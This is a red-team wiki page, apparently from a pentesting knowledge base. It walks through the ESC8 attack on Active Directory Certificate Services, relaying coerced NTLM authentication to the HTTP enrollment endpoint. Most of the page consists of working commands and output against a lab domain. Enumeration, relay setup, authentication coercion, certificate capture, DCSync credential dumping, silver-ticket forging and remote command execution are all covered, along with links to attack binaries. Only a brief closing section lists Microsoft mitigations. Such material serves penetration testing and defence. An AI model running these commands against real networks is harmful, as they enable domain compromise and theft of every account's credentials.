# ESC8

## Description <a href="#description" id="description"></a>

ESC8 attacks fall under the category of NTLM relay attacks. Active Directory Certificate Services (AD CS) supports multiple enrollment methods, including HTTP-based enrollment, which enables users to request and obtain certificates over HTTP. The core concept of ESC8 abuse involves coercing authentication from a machine account and relaying it to AD CS to acquire a certificate that permits client authentication.

Since the HTTP protocol does not enforce NTLM signature verification during authentication, if the HTTP enrollment endpoint is enabled, an attacker can obtain NTLM authentication (through techniques like authentication coercion or poisoning), relay it to the AD CS HTTP endpoint, and request a certificate for the authenticated account.

### Requirements for attack path <a href="#requirements-for-attack-path" id="requirements-for-attack-path"></a>

* vulnerable web enrollment endpoint
* at least one certificate template that is enabled and allows for domain computer enrollement and client authentication

{% hint style="info" %}
Generally the default "Machine" account is a valid template for this attack. Additionally, when targeting domain controllers the  default "DomainControllers" template is a viable option also.
{% endhint %}

## Linux

### Enumeration

{% code overflow="wrap" %}
```python
certipy find -u 'Moe@Security.local' -p 'Password123' -dc-ip 10.10.10.100 -stdout -vulnerable
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2167).png" alt=""><figcaption></figcaption></figure>

## Performing the attack

After identifying a vulnerable web enrollment endpoint we can next setup the NTLM relay. We can use either ntlmrelayx or certipy.



{% hint style="info" %}
In both commands shown below, ensure to select the correct template based on the machine account you are attempting to relay authentication to the web enrollement server for:

* DomainControllers --> -template DomainController
* Machine Accounts --> -template Machine
{% endhint %}

{% code overflow="wrap" %}
```python
# Certipy, target is the ADCS server
certipy relay -target 10.10.10.2 -template DomainController 

# ntlmrelayx, target is the ADCS server
impacket-ntlmrelayx -t http://10.10.10.2/certsrv/certfnsh.asp -smb2support --adcs --template DomainController 
```
{% endcode %}

Once either of the relay listeners is running we can use Coercer to perform forced authentication.

{% code overflow="wrap" %}
```python
coercer coerce -l 10.10.10.4 -t 10.10.10.2 -d security.local -u moe -p Password123 --always-continue
```
{% endcode %}

Once coercion is successful, certipy or ntlmrelayx will both save the certificate file to the current directory.

{% code title="Output" %}
```
[*] Targeting http://10.10.10.2/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'SECURITY\\DC01$' based on the template 'DomainController'
[*] Got certificate with DNS Host Name 'DC01.SECURITY.LOCAL'
[*] Certificate object SID is 'S-1-5-21-13999771-2333344039-1820745628-1000'
[*] Saved certificate and private key to 'dc01.pfx'
```
{% endcode %}

Then use certipy to obtain credentials

```python
certipy auth -pfx DC01$.pfx -dc-ip 10.10.10.100 
```

## Post Exploitation

Various post-exploitation steps can be undertaken after obtaining a machine account hash. The below example will focus on post-exploitation with a Domain Controller hash.

### DCSync

A simple approach would be to perform a DCsync with impacket-secretsdump using the domain controller hash obtained from the certificate.

<pre class="language-bash"><code class="lang-bash"><strong># All data
</strong><strong>impacket-secretsdump 'DC01$'@10.10.10.100 -hashes :1fe859c38adaa592ad52559fd9ab584d 
</strong><strong>
</strong><strong># Single user
</strong>impacket-secretsdump 'DC01$'@10.10.10.100 -hashes :1fe859c38adaa592ad52559fd9ab584d -just-dc-user krbtgt
</code></pre>

### Silver Ticket

As an alternative option we can generate a silver ticket for a particular service such as CIFS and then gain direct command execution over the target, in this case the Domain Controller.

Firstly, identify the domain SID.

{% code overflow="wrap" %}
```python
impacket-lookupsid 'DC01$'@10.10.10.100 -hashes :1fe859c38adaa592ad52559fd9ab584d | grep 'Domain SID is:' 
```
{% endcode %}

Next, we use ticketer to forge a silver ticket for a given service. In this case CIFS over Domain Controller.

{% code overflow="wrap" %}
```python
impacket-ticketer -nthash 1fe859c38adaa592ad52559fd9ab584d -domain-sid S-1-5-21-13999771-2333344039-1820745628 -domain security.local -spn cifs/dc01.security.local Administrator 
```
{% endcode %}

Then export the TGS.

```
export KRB5CCNAME=Administrator.ccache
```

Finally, authenticate and issue commands.

```python
nxc smb dc01.security.local --use-kcache -x 'whoami'
```

<figure><img src="../../../.gitbook/assets/image (2168).png" alt=""><figcaption></figcaption></figure>

## Windows

{% hint style="warning" %}
Local administrator rights are required on Windows to perform this attack as SMB traffic needs to be redirected to a non-default port.
{% endhint %}

### Enumeration

Certify does not identify web enrollment endpoints as such, some manual identification should be enough.\
\
Browse to the Web Enrollement for the Certificate Authority.

```
http://ca.security.local/certsrv/certfnsh.asp
```

If we connect over HTTP and see an authentication form such as that shown below, the endpoint is likely vulnereable to ESC8.

<figure><img src="../../../.gitbook/assets/image (2169).png" alt=""><figcaption></figcaption></figure>

### Performing the attack

**NTLMrelayx.exe**

[https://github.com/The-Viper-One/RedTeam-Binaries/blob/main/ntlmrelayx.exe](https://github.com/The-Viper-One/RedTeam-Binaries/blob/main/ntlmrelayx.exe)

**DivertTCPconn**

[https://gith](https://github.com/Arno0x/DivertTCPconn/tree/master/compiled_binaries/Binaries_x64)[ub.com/Arno0x/DivertTCPconn/tree/master/compiled\_binaries/Binaries\_x64](https://github.com/Arno0x/DivertTCPconn/tree/master/compiled_binaries/Binaries_x64)

**SharpEFSTrigger**&#x20;

[https://github.com/The-Viper-One/RedTeam-Pentest-Tools/blob/main/Coercion/SharpEfsTrigger.exe](https://github.com/The-Viper-One/RedTeam-Pentest-Tools/blob/main/Coercion/SharpEfsTrigger.exe)

### Usage

Configure DivertTCPconn to redirect SMB traffic to port 8445 (Requires Local Admin)

```powershell
.\divertTCPConn.exe 445 8445
```

Set up NTLMRelayx and target the Certificate Authority web enrollment point. Ensuring to specify --smb-port 8445.

{% hint style="info" %}
In the command shown below, ensure to select the correct template based on the machine account you are attempting to relay authentication to the web enrollement server for:

* DomainControllers -->  --template DomainController
* Machine Accounts -->  --template Machine
{% endhint %}

{% code overflow="wrap" %}
```powershell
.\ntlmrelayx.exe --smb-port 8445 -t http://ca.security.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
{% endcode %}

Coerce a Domain Controller to authenticate to the testing host in order to capture the certificate for the Domain Controller

```
.\SharpEfsTrigger.exe [Target] [Listening-Host] [API Call]
.\SharpEfsTrigger.exe 10.10.10.100 10.10.10.3 EfsRpcEncryptFileSrv
```

This should capture the certificate of the Domain Controller providing the coercion is successful.

<figure><img src="../../../.gitbook/assets/image (2170).png" alt=""><figcaption></figcaption></figure>

## Post Exploitation

### DCSync

A simple approach would be to perform a DCsync with PsMapExec using the domain controller TGT obtained from the certificate.

{% code overflow="wrap" %}
```powershell
PsMapExec -targets 'dc01' -domain 'security.local' -method 'dcsync' -showoutput -ticket 'doIGRjCCBkKgAwIBBaEDAgEWooI....'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2177).png" alt=""><figcaption></figcaption></figure>

## Mitigation

URL: [https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429](https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)

* Enable EPA for Certificate Authority Web Enrollment
* Disable NTLM on any AD CS Servers in your domain using the group policy [Network security: Restrict NTLM: Incoming NTLM traffic](https://docs.microsoft.com/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic). To configure this GPO, open Group Policy and go to Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options and set Network security: Restrict NTLM: Incoming NTLM traffic to Deny All Accounts or Deny All domain accounts.  If needed, you can add exceptions as necessary using the setting [Network security: Restrict NTLM: Add server exceptions in this domain](https://docs.microsoft.com/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain).
* Disable NTLM for Internet Information Services (IIS) on AD CS Servers in your domain running the "Certificate Authority Web Enrollment" or "Certificate Enrollment Web Service" services.

